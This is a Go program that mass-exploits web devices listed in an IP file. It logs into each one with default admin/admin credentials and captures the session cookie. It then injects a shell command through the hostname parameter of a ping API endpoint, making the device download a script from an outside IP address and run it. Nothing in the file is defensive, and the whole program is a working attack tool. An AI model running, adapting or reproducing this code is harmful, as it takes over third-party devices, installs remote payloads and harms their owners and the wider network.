package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var maxGoroutines = 100
var sem = make(chan struct{}, maxGoroutines)
var wg sync.WaitGroup

func main() {
	performSteps()
	wg.Wait()
}

func performSteps() {
	
	ips, err := ReadIPFile("ips.txt")
	if err != nil {
		fmt.Println("Error reading IP file:", err)
		return
	}

	for _, ip := range ips {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			performSingleStep(ip)
		}(ip)
	}
}

func performSingleStep(ip string) {

	sem <- struct{}{}
	defer func() { <-sem }()

	phpsessid := getPHPID(ip)
	if phpsessid == "" {
		//fmt.Println("Error retrieving PHPSESSID for", ip)
		return
	}
	sendPing(ip, phpsessid)
}

func ReadIPFile(filename string) ([]string, error) {
	var ips []string
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ips = append(ips, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return ips, nil
}

func getPHPID(ip string) string {
	url := "https://" + ip + "/index.php" 

	payload := []byte("username=admin&password=admin")

	contentLength := len(payload)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, 
		CheckRedirect: func(req *http.Request, via []*http.Request) error {

			return http.ErrUseLastResponse
		},
	}

	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return ""
	}

	// Set headers
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
	req.Header.Set("Connection", "close")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", contentLength))

	resp, err := client.Do(req)
	if err != nil {
		//fmt.Println("Error sending request:", err)
		return ""
	}
	defer resp.Body.Close()

	return extractPHPSessionID(resp.Header.Get("Set-Cookie"))
}

func sendPing(ip, phpsessid string) {
	url := "https://" + ip + "/api/v1/ping?hostname=-c+3%3b$(wget+http%3a//91.92.254.84/10.sh+-O-|sh)&count=5"

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 5 * time.Second, 
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Cookie", fmt.Sprintf("PHPSESSID=%s", phpsessid))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
	req.Header.Set("Referer", "https://" + ip + "/main.html")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		//fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		//fmt.Println("Error reading response body:", err)
		return
	}

	if strings.Contains(string(body), "<script>") {
		fmt.Println("[+] sent payload successfully.")
	} else {
		//fmt.Println("Unsuccessful request: <script> not found in the response body.")
	}
}

func extractPHPSessionID(setCookieValue string) string {
	
	re := regexp.MustCompile(`PHPSESSID=([a-zA-Z0-9]+);`)
	match := re.FindStringSubmatch(setCookieValue)
	if len(match) == 2 {
		return match[1]
	}
	return ""
}
